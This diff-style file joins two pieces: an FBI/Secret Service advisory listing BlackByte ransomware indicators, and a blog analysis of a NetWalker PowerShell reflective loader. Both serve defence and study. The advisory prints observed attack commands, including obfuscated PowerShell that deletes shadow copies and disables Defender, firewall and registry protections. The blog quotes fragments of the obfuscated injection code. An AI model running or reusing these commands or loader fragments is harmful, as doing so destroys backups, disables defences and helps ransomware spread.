@@ -1,0 +1,627 @@
+0  
+Co-Authored by:  TLP:WHITE Product ID: CU-000163-MW 
+
+  February 11, 2022 
+
+  
+
+ 
+   
+ 
+
+Indicators of Compromise Associated with 
+BlackByte Ransomware 
+SUMMARY 
+
+This joint Cybersecurity Advisory was developed by the Federal Bureau of Investigation (FBI) 
+and the U.S. Secret Service (USSS) to provide information on BlackByte ransomware. As of 
+November 2021, BlackByte ransomware had compromised multiple US and foreign 
+businesses, including entities in at least three US critical infrastructure sectors (government 
+facilities, financial, and food & agriculture). BlackByte is a Ransomware as a Service (RaaS) 
+group that encrypts files on compromised Windows host systems, including physical and 
+virtual servers.  
+
+ 
+
+TECHNICAL DETAILS 
+
+The BlackByte executable leaves a ransom note in all directories where encryption occurs. 
+The ransom note includes the .onion site that contains instructions for paying the ransom and 
+receiving a decryption key. Some victims reported the actors used a known Microsoft 
+Exchange Server vulnerability as a means of gaining access to their networks. Once in, 
+actors deploy tools to move laterally across the network and escalate privileges before 
+exfiltrating and encrypting files. In some instances, BlackByte ransomware actors have only 
+partially encrypted files. In cases where decryption is not possible, some data recovery can 
+occur. Previous versions of BlackByte ransomware downloaded a .png file from IP addresses 
+185.93.6.31 and 45.9.148.114 prior to encryption. A newer version encrypts without 
+communicating with any external IP addresses. BlackByte ransomware runs executables 
+from c:\windows\system32\ and C:\Windows\. Process injection has been observed on 
+processes it creates. 
+
+ 
+
+To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact 
+your local FBI field office at www.fbi.gov/contact-us/field-offices or U.S. Secret Service Field Office at 
+www.secretservice.gov/contact/field-offices/. When available, please include the following information regarding 
+the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment 
+used for the activity; the name of the submitting company or organization; and a designated point of contact. To 
+request incident response resources or technical assistance related to these threats, contact CISA at 
+CISAServiceDesk@cisa.dhs.gov. 
+
+This document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information 
+carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public 
+release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction. 
+For more information on the Traffic Light Protocol, see http://www.us-cert.gov/tlp/. 
+ 
+
+TLP: WHITE   
+
+
+
+TLP:WHITE FBI | USSS 
+
+  
+ 
+
+ 
+
+Indicators of Compromise 
+
+The following indicators of compromise (IOCs) are assessed to be associated with BlackByte 
+activity: 
+
+Suspicious files discovered in the following locations: 
+Windows\Microsoft.NET\Framework64\v4.0.30319\Temporary ASP.NET 
+Files\root\e22c2559\92c7e946 
+inetpub\wwwroot\aspnet_client 
+Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth 
+Program Files\Microsoft\Exchange Server\V15\FrontEnd\HttpProxy\owa\auth\Current 
+Program Files\Microsoft\Exchange 
+Server\V15\FrontEnd\HttpProxy\owa\auth\Current\themes 
+Program Files\Microsoft\Exchange 
+Server\V15\FrontEnd\HttpProxy\owa\auth\Current\scripts 
+Program Files\Microsoft\Exchange 
+Server\V15\FrontEnd\HttpProxy\owa\auth\Current\scripts\premium 
+
+ 
+
+The filenames for suspicious ASPX files appeared to have the following naming conventions: 
+
+ <5 random alphabetical characters>.aspx 
+ error<2 capital letters>.aspx 
+ iismeta<4 random numbers>.aspx 
+
+ 
+
+Suspicious files were also discovered at: 
+%AppData%\BB.ico 
+This file is the icon given to files with a .blackbyte file extension. 
+%AppData%\BlackByteRestore.txt 
+This file is the ransom note that is left in every folder where files are encrypted. 
+%AppData%\dummy 
+This file is a text file containing a list of machine names that can be reached on the 
+network. 
+%HOMEPATH%\complex.exe 
+This file is the ransomware executable. 
+Users\tree.dll  
+This file contains the message "Your HACKED by BlackByte team. Connect us to restore 
+your system." (SIC)  
+
+ 
+
+Page 2 o f 6  |  Product ID: CU-000163-MW  
+
+TLP: WHITE   
+
+
+
+TLP:WHITE FBI | USSS 
+
+  
+ 
+
+ 
+
+Scheduled tasks may be created and artifacts have been observed at 
+Windows\System32\Tasks: 
+
+C:\Users\<username>\complex.exe -single <SHA256>.  
+This command appears to launch the ransomware. 
+C:\Windows\System32\cmd.exe /c for /l %x in (1,1,75) do start 
+wordpad.exe /p C:\Users\tree.dll.  
+This command attempts to open tree.dll in wordpad 75 times and then prints the contents. 
+
+ 
+
+IIS logs contain GET and POST requests to various malicious ASPX files that follow a 
+pattern of "<FILE_PATH>/<SUSPICIOUS_FILENAME>.aspxexec_code=Response.Write" 
+
+ 
+
+Below is a list of hashes of suspicious files that have been observed on systems affected by 
+BlackByte ransomware: 
+
+MD5 Hashes:  
+4d2da36174633565f3dd5ed6dc5033c4 959a7df5c465fcd963a641d87c18a565 
+cd7034692d8f29f9146deb3641de7986 5f40e1859053b70df9c0753d327f2cee 
+d63a7756bfdcd2be6c755bf288a92c8b df7befc8cdc3c5434ef27cc669fb1e4b 
+eed7357ab8d2fe31ea3dbcf3f9b7ec74 51f2cf541f004d3c1fa8b0f94c89914a 
+695e343b81a7b0208cbae33e11f7044c d9e94f076d175ace80f211ea298fa46e 
+296c51eb03e70808304b5f0e050f4f94 8320d9ec2eab7f5ff49186b2e630a15f 
+0c7b8da133799dd72d0dbe3ea012031e cea6be26d81a8ff3db0d9da666cd0f8f 
+a77899602387665cddb6a0f021184a2b 31f818372fa07d1fd158c91510b6a077 
+1473c91e9c0588f92928bed0ebf5e0f4 d9e94f076d175ace80f211ea298fa46e 
+28b791746c97c0c04dcbfe0954e7173b a9cf6dce244ad9afd8ca92820b9c11b9 
+52b8ae74406e2f52fd81c8458647acd8 7139415fecd716bec6d38d2004176f5d 
+1785f4058c78ae3dd030808212ae3b04 c13bf39e2f8bf49c9754de7fb1396a33 
+b8e24e6436f6bed17757d011780e87b9 5c0a549ae45d9abe54ab662e53c484e2 
+8dfa48e56fc3a6a2272771e708cdb4d2 ad29212716d0b074d976ad7e33b8f35f 
+4ce0bdd2d4303bf77611b8b34c7d2883 d4aa276a7fbe8dcd858174eeacbb26ce 
+c010d1326689b95a3d8106f75003427c 9344afc63753cd5e2ee0ff9aed43dc56 
+ae6fbc60ba9c0f3a0fef72aeffcd3dc7 e2eb5b57a8765856be897b4f6dadca18 
+405cb8b1e55bb2a50f2ef3e7c2b28496 58e8043876f2f302fbc98d00c270778b 
+11e35160fc4efabd0a3bd7a7c6afc91b d2a15e76a4bfa7eb007a07fc8738edfb 
+659b77f88288b4874b5abe41ed36380d e46bfbdf1031ea5a383040d0aa598d45 
+151c6f04aeff0e00c54929f25328f6f7  
+
+Page 3 o f 6  |  Product ID: CU-000163-MW  
+
+TLP: WHITE   
+
+
+
+TLP:WHITE FBI | USSS 
+
+  
+ 
+
+Below is a list of observed commands that were executed by complex.exe: 
+
+Observed Commands: 
+cmd.exe /c powershell -command "$x = 
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA'
++'G4ARAB'+'lAGYA'+'ZQB'+'uAG'+'QA'));Stop-Service -Name $x;Set-Service -StartupType 
+Disabled $x" 
+schtasks.exe  /DELETE /TN "\"Raccine Rules Updater\"" /F 
+cmd.exe /c vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB 
+cmd.exe /c vssadmin resize shadowstorage /for=c: /on=c: /maxsize=unbounded 
+cmd.exe /c vssadmin resize shadowstorage /for=d: /on=d: /maxsize=401MB 
+cmd.exe /c vssadmin resize shadowstorage /for=d: /on=d: /maxsize=unbounded 
+cmd.exe /c vssadmin resize shadowstorage /for=e: /on=e: /maxsize=401MB 
+cmd.exe /c vssadmin resize shadowstorage /for=e: /on=e: /maxsize=unbounded 
+cmd.exe /c vssadmin resize shadowstorage /for=f: /on=f: /maxsize=401MB 
+cmd.exe /c vssadmin resize shadowstorage /for=f: /on=f: /maxsize=unbounded 
+cmd.exe /c vssadmin resize shadowstorage /for=g: /on=g: /maxsize=401MB 
+cmd.exe /c vssadmin resize shadowstorage /for=g: /on=g: /maxsize=unbounded 
+cmd.exe /c vssadmin resize shadowstorage /for=h: /on=h: /maxsize=401MB 
+cmd.exe /c vssadmin resize shadowstorage /for=h: /on=h: /maxsize=unbounded 
+powershell.exe $x = 
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RwBlA
+HQALQBXAG0AaQBPAGIAagBlAGMAdAAg'+'AFcAaQBuADMAMgBfAFMAaABhAGQAb
+wB3AGMAbwBwAHkAIAB8AC'+'AARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A
+CAAewAkA'+'F8ALgBEAGUAbABlAHQAZQAoACkAOwB9AA=='));Invoke-Expression $x 
+sc.exe config SQLTELEMETRY start= disabled 
+sc.exe config SQLTELEMETRY$ECWDB2 start= disabled 
+sc.exe config SQLWriter start= disabled 
+sc.exe config SstpSvc start= disabled 
+powershell.exe Set-MpPreference -EnableControlledFolderAccess Disabled 
+sc.exe config MBAMService start= disabled 
+sc.exe config wuauserv start= disabled 
+sc.exe config Dnscache start= auto 
+sc.exe config fdPHost start= auto 
+sc.exe config FDResPub start= auto 
+sc.exe config SSDPSRV start= auto 
+sc.exe config upnphost start= auto 
+sc.exe config RemoteRegistry start= auto 
+
+Page 4 o f 6  |  Product ID: CU-000163-MW  
+
+TLP: WHITE   
+
+
+
+TLP:WHITE FBI | USSS 
+
+  
+cmd.exe /c netsh advfirewall firewall set rule "group=\"Network Discovery\"" new 
+enable=Yes 
+cmd.exe /c netsh advfirewall firewall set rule "group=\"File and Printer Sharing\"" new 
+enable=Yes 
+cmd.exe  /c reg add 
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v 
+LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f 
+cmd.exe /c reg add 
+HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v 
+EnableLinkedConnections /t REG_DWORD /d 1 /f 
+cmd.exe  /c reg add HKLM\SYSTEM\CurrentControlSet\Control\FileSystem /v 
+LongPathsEnabled /t REG_DWORD /d 1 /f 
+mountvol.exe A: \\?\Volume{d7e47829-0000-0000-0000-100000000000}\ 
+mountvol.exe B: \\?\Volume{d7e47829-0000-0000-0000-b0e213000000}\ 
+mountvol.exe  E: \\?\Volume{fce79ce0-b01f-11e6-b968-806e6f6e6963}\ 
+powershell.exe  Install-WindowsFeature -Name \"RSAT-AD-PowerShell\" –
+IncludeAllSubFeature 
+net.exe view 
+arp.exe  -a 
+powershell.exe Import-Module ActiveDirectory;Get-ADComputer -Filter * -Properties * | FT 
+Name 
+notepad.exe %appdata%\RestoreMyFiles_BlackByte.txt 
+cmd.exe /c ping 1.1.1.1 -n 10 > Nul & Del C:\Users\REM\Desktop\hybrid-9-8\complex.exe 
+
+ 
+
+The base64 encoded string in the following command: 
+powershell.exe $x = 
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('RwBlA
+HQALQBXAG0AaQBPAGIAagBlAGMAdAAg'+'AFcAaQBuADMAMgBfAFMAaABhAGQAb
+wB3AGMAbwBwAHkAIAB8AC'+'AARgBvAHIARQBhAGMAaAAtAE8AYgBqAGUAYwB0A
+CAAewAkA'+'F8ALgBEAGUAbABlAHQAZQAoACkAOwB9AA=='));Invoke-Expression $x 
+
+ 
+
+Decodes to: 
+Get-WmiObject Win32_Shadowcopy | ForEach-Object {$_.Delete();} 
+
+ 
+
+The base64 encoded string in the following command: 
+cmd.exe /c powershell -command "$x = 
+[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('VwBpA'+'G4ARA
+B'+'lAGYA'+'ZQB'+'uAG'+'QA'));Stop-Service -Name $x;Set-Service -StartupType Disabled $x" 
+
+Page 5 o f 6  |  Product ID: CU-000163-MW  
+
+TLP: WHITE   
+
+
+
+TLP:WHITE FBI | USSS 
+
+  
+ 
+
+MITIGATIONS 
+
+ Implement regular backups of all data to be stored as air gapped, password protected 
+copies offline. Ensure these copies are not accessible for modification or deletion from 
+any system where the original data resides.  
+
+• Implement network segmentation, such that all machines on your network are not 
+accessible from every other machine.  
+
+• Install and regularly update antivirus software on all hosts, and enable real time 
+detection.  
+
+• Install updates/patch operating systems, software, and firmware as soon as 
+updates/patches are released.  
+
+• Review domain controllers, servers, workstations, and active directories for new or 
+unrecognized user accounts.  
+
+• Audit user accounts with administrative privileges and configure access controls with 
+least privilege in mind. Do not give all users administrative privileges.  
+
+• Disable unused remote access/Remote Desktop Protocol (RDP) ports and monitor 
+remote access/RDP logs for any unusual activity.  
+
+• Consider adding an email banner to emails received from outside your organization.  
+• Disable hyperlinks in received emails.  
+• Use double authentication when logging into accounts or services.  
+• Ensure routine auditing is conducted for all accounts. 
+• Ensure all the identified IOCs are input into the network SIEM for continuous 
+
+monitoring and alerts. 
+
+RESOURCES 
+
+ For additional resources related to the prevention and mitigation of ransomware, go to 
+https://www.stopransomware.gov as well as the CISA-Multi-State Information Sharing 
+and Analysis Center (MS-ISAC) Joint Ransomware Guide. Stopransomware.gov is the 
+Government’s official one-stop location for resources to tackle ransomware more 
+effectively. 
+
+ CISA’s Ransomware Readiness Assessment (RRA) is a no-cost self-assessment 
+based on a tiered set of practices to help organizations better assess how well they 
+are equipped to defend and recover from a ransomware incident.  
+
+ CISA offers a range of no-cost cyber hygiene services to help critical infrastructure 
+organizations assess, identify, and reduce their exposure to threats, including 
+ransomware. By requesting these services, organizations of any size could find ways 
+to reduce their risk and mitigate attack vectors. 
+
+Page 6 o f 6  |  Product ID: CU-000163-MW  
+
+TLP: WHITE   
+
+
+
+Netwalker: from Powershell reflective loader to injected dll
+0x00-0x7f.github.io/Netwalker-from-Powershell-reflective-loader-to-injected-Dll/
+
+0x00-0x7F blog February 11, 2022
+
+Hi! I have lately started delving into maliious powershell payloads and came across a really intriguing
+powershell loader for “Netwalker ransomware”, performing fileless attack. Fileless techniques enable attackers
+to directly load and execute malicious binary in memory without actually storing it on disk by abusing available
+legitimate tools on victim machine. Such threats leave no trace of execution and are capable of evading any
+traditional security tools. This post thoroughly discusses how first stage powershell script filelessly loads and
+executes embedded payload through reflective Dll injection.
+
+SHA-256 hash of the sample being analyzed:
+f4656a9af30e98ed2103194f798fa00fd1686618e3e62fba6b15c9959135b7be
+
+Prior knowledge required:
+
+Basic Powershell understanding
+using .NET reflection to access Windows API in PowerShell
+Windows APIs for Process/Dll injection
+
+This is around ~5 MBs of powershell script using three layers of encoding, encryption and obfuscation
+respectively to hide ransomware dll and supporting powershell commands for reflective Dll injection. The
+uppermost layer executes very long base64 encoded command (screenshot covers only a small portion of this
+command)
+
+Processing Base64 encoded layer 1
+In order to get decoded output from initial script, I shall run powershell script into my VM’s Powershell ISE but
+as the Invoke-Expression cmdlet will process base64-encoded payload and execute the ransomware therefore,
+I’ll modify the script for debugging by replacing this comdlet with a variable to store result of base64 decoded
+command and dump output in a file as shown in the figure below
+
+Processing Encrypted layer 2
+
+1/18
+
+
+
+base64 decoded second layer once again contains a very long bytearray in hex format which is processed in
+two steps
+
+1) bytearray contents are decrypted in a for loop with 1 byte hardcoded xor key
+
+2) decrypted contents are stored as ASCII string in another variable in order to be able to create scriptblock for
+decrypted contents and execute it using Invoke-Command cmdlet
+
+but I shall also modify second layer to get decrypted layer three contents and dump result into another output
+file as shown in the figure below
+
+2/18
+
+
+
+decryptedlayer3.ps1 now contains the obfuscated layer three powershell script embedding ransomware dlls in
+bytearrays and other commands to process the malicious payload
+
+Processing Obfuscated layer 3
+Let’s start digging into layer three powershell script which is quite obfuscated having lengthy and random string
+variable and routine names responsible to drop final payload. It is required to perform following steps in order to
+execute Netwalker ransomware on victim’s machine
+
+define variables to invoke in-memory Windows API function calls without compilation
+define routines to load dll without using Windows loader
+detect environment
+get PID of a legitimate process from a list of running processes and inject payload via custom loader
+delete shadow copies
+
+First off, it defines required variables and routines:
+
+to invoke in-memory Windows API function calls without compilation, C# code to declare structs and
+enums for memory manipulation is defined inside a variable as shown below
+
+and to invoke kernell32.dll APIs using wrapper .Net methods available in powershell
+
+3/18
+
+
+
+final command in this case will let us instantiate objects by making Microsoft .Net core classes available in our
+powershell session and ensure ransomware’s true memory residence through reflection.
+
+Following set of routines help correctly compute required memory addresses and relocations by casting
+integer datatypes (signed integers to Unsigned integers and vice versa) so that the script could act as its own
+custom loader and load dll without using Windows loader
+
+Finally it defines a bunch of routines to write embedded malicious binary into another process’s memory and
+execute it.
+
+Script starts its execution by detecting underlying processor’s architecture to know whether it is running on x86
+or amd64 and to prepare 32-bit or 64-bit dll accordingly using following if-else block
+
+4/18
+
+
+
+[byte[]]$EbihwfodUZMKtNCBx = $ptFvKdtq 
+$aukhgaZFiPJBarSpJc = $false 
+if ( ( Get-WmiObject Win32_processor).AddressWidth -eq 64 ) 
+{ 
+[byte[]]$EbihwfodUZMKtNCBx = $GxwyKvgEkr 
+$aukhgaZFiPJBarSpJc = $true     
+if ( $env:PROCESSOR_ARCHITECTURE -ne 'amd64' ) 
+   { 
+     if ($myInvocation.Line)  
+        { 
+           &"$env:WINDIR\sysnative\windowspowershell\v1.0\powershell.exe" -ExecutionPolicy ByPass -
+NoLogo -NonInteractive -NoProfile -NoExit $myInvocation.Line 
+        } 
+     else 
+        { 
+           &"$env:WINDIR\sysnative\windowspowershell\v1.0\powershell.exe" -ExecutionPolicy ByPass -
+NoLogo -NonInteractive -NoProfile -NoExit -file "$($myInvocation.InvocationName)" $args 
+        } 
+     exit $lastexitcode 
+   } 
+}
+
+later it allocates memory in current process’s address space and starts writing dll on the allocated memory
+using following for loop
+
+for( $dxQpkwU = 0; $dxQpkwU -lt $TKgfkdkQrLMAN.KGcnFrQVhkckQriBC.nKkeCknfm; $dxQpkwU++ ) 
+{ 
+   $PdWhwldJHtQhtsMJe = [System.Runtime.InteropServices.Marshal]::PtrToStructure( 
+$lItUIbvCvHxzMmrKtX,[Type][Fvh.wTEWKRjOqBX] ) 
+   $rZKYDiOJE  = RBeMnMHvnbNEob $eIr $( ULhnbcyXERLvVtGXUp $PdWhwldJHtQhtsMJe.sUtYsMhA ) 
+   $MxyiIYGMhxakrDbKyjL = RBeMnMHvnbNEob $upEcLTMCGhc $( ULhnbcyXERLvVtGXUp 
+$PdWhwldJHtQhtsMJe.cymIspbCOaY ) 
+   $mofiZSsnxylxNuA = $AaauDVCQMlKUXx::PMUN( $VxxHhZYpWSgsPvKNuDx, $MxyiIYGMhxakrDbKyjL, $rZKYDiOJE, 
+$PdWhwldJHtQhtsMJe.mkvugoDzrJgTSSJp, [ref]([UInt32]0 ) ) 
+   
+   if ( $mofiZSsnxylxNuA -eq $false ) 
+      { 
+        return 
+      } 
+   $lItUIbvCvHxzMmrKtX = RBeMnMHvnbNEob $lItUIbvCvHxzMmrKtX 
+$([System.Runtime.InteropServices.Marshal]::SizeOf([Type][Fvh.wTEWKRjOqBX])) 
+}
+
+snapshot of object containig dll that gets written into current process’s memory
+
+5/18
+
+
+
+after that it calls following routine with certain parameters to inject payload by specifying a legitimate target
+process which is ‘explorer.exe’ in this case along with memory location pointer for buffer containg Dll and size
+of the buffer containing dll
+
+this routine finds PID of explorer.exe form a list of running processes and passes obtained PID to final routine
+
+6/18
+
+
+
+which first reflectively injects ransomware dll into explorer.exe by allocating a chunk of memory of specified size
+into its address space and writing ransomware dll on the allocated memory and then executes it by creating a
+thread that runs in the virtual address space of Explorer.exe process
+
+7/18
+
+
+
+and in the end deletes shadow copies of the data being held on the system at that particular time to completely
+eliminate any possibility of recovering it and performs required memory cleanup using following set of
+commands
+
+as soon as script exits, FE026B-Readme.txt window appears on the system with ransom message and all
+encrypted files with fe026b extension are no longer accessible
+
+Note: Ransomware dll being injected can be dumped into a binary file in powershell script, which has SHA-256
+302ff75667460accbbd909275cf912f4543c4fb4ea9f0d0bad2f4d5e6225837b hash but it can be seen that it is
+64-bit PE file and first two bytes in this case have wrong hex value 0xDEAD
+
+8/18
+
+
+
+replacng first two bytes 0xDEAD with 0x4D5A in DOS header in HxD editor would result in Netwalker
+ransomware dll with f93209fccd0c452b8b5dc9db46341281344156bbedd23a47d2d551f80f460534 SHA-256
+hash.
+
+Deciphering Netwalker x86-64 DLL
+Let’s load final dll in IDA and perform basic static analysis first, I’ll start by looking up for strings, but they are
+mostly useless, moreover, it has only one export i.e., main entry which seems to implement all its functionality
+
+second important thing to note here is that it has no imports address table, which implies that it might be
+obfuscating APIs or strings with some hashing or encryption algorithm, this can be verified by loading the dll in
+PEiD and looking for possible algorithms in its Krypto ANALyzer plugin which shows multiple references to
+different encoding, hashing and encrypt/decrypt algorithms in dll as shown in the figure below
+
+9/18
+
+
+
+If I randomly pick a CRC32 reference and look it up in dll, it is found in sub_180005D60 routine being used in a
+loop
+
+10/18
+
+
+
+do-while loop in decompiled routine shows CRC32 division flow
+
+let’s rename this routine to crc32_checksum and look for its cross references, result shows it is cross
+referenced two times in sub_180001000, if this routine is subsequently checked for further cross references, it
+shows ~165 references
+
+11/18
+
+
+
+we can assume here that the routine sub_180001000 being cross referenced ~165 times is possibly decrypting
+strings, I’ll rename it to decrypt_strings
+
+now let’s take a closer look at sub_180001490 routine which almost has all the Xrefs to decrypt_strings,
+following code shows it is taking two arguments v1, which is being used in all of its calls and a 4-byte hex value
+which seems to be CRC32 hash and retrun value is being stored to different offsets of an array
+
+12/18
+
+
+
+this routine has multiple similar code blocks but with different hash values, here it can be assumed that it is
+decrypting APIs from different libraries, let’s rename it to resolve_imports and look for its Xrefs which leads to
+DLL’s main DllEntryPoint routine - now it’s time to look into it dynamically.
+
+First routine that is being called by DLL is resolve_imports, which in turn calls sub_180001310 routine, it is
+taking 0x84C05E40 hash value as parameter, a quick Google search shows it is for “ntdll.dll” which can also
+be verified with Python
+
+this routine returns handle for ntdll.dll library, later it takes another hash value 0xA1D45974 which is resolved
+to RtlAllocateHeap API, it is first called to allocate a block of memory on heap to later store resolved
+addresses there on different array indexes
+
+this routine decrypts and resolves serveral APIs from ntdll.dll, kernel32.dll, advapi32.dll, use32.dll, mpr.dll,
+shell32.dll, netapi32.dll, ole32.dll, oleaut32.dll and psapi.dll libraries. I wrote a simple IDAPython script here
+which resolves CRC32 hashes and adds resolved value in comment
+
+13/18
+
+
+
+after resolving imports, it continues to check for stomped MZ header 0xDEAD by first copying header value
+0xDEAD in eax, setting up rbx with a certain address and later subtracting 0x400 from rbx in each iteration to
+reach image’s base address as shown by the loop in figure below
+
+if 0xDEAD header value is intact (i.e., making sure DLL is being run injected in explorer.exe), it continues
+further to fix MZ header in memory and read image’s resources - otherwise it’ll throw ACCESS_VIOLATION
+exception and exits
+
+14/18
+
+
+
+after required resource has been loaded in memory, sub_18000EAF0 routine processes it by first extracting
+first 4 bytes of data which is probably length of key, next 7 bytes (cZu-H!<) are extracted as RC4 key which is
+being used to decrypt rest of the payload - following code from sub_18000EAF0 routine implemets 3
+recognizable RC4 loops 1. Initialization (creating Substitution Box) 2. Scrambling Substitution box with key
+to generate a pseudo-random keystream 3. xoring keystream with rest of the data
+
+15/18
+
+
+
+decrypted data seems to be malware’s embedded configuration in json format
+
+16/18
+
+
+
+this can also be verified by copying resource as hex string along with 7-byte hex key on Cyberchef
+
+next routine sub_180004600 parses configuration to get list of file extensions which needs to be encrypted,
+default paths and files that should be whitelisted, attacker’s ToR info and ransomware note along with
+ransomware note file name and format, subsequent routines decrypt ransom note with AES decryption
+algorithm by using 256-bit hardcoded key, checks running processes to kill any blacklisted process and
+eventually performs ransomware activity.
+
+That’s it. See you next time.
+
+Sources:
+
+17/18
+
+
+
+1. https://blog.trendmicro.com/trendlabs-security-intelligence/netwalker-fileless-ransomware-injected-via-
+reflective-loading/
+
+2. https://any.run/report/f4656a9af30e98ed2103194f798fa00fd1686618e3e62fba6b15c9959135b7be/ca44ad38-
+0e46-455e-8cfd-42fb53d41a1d
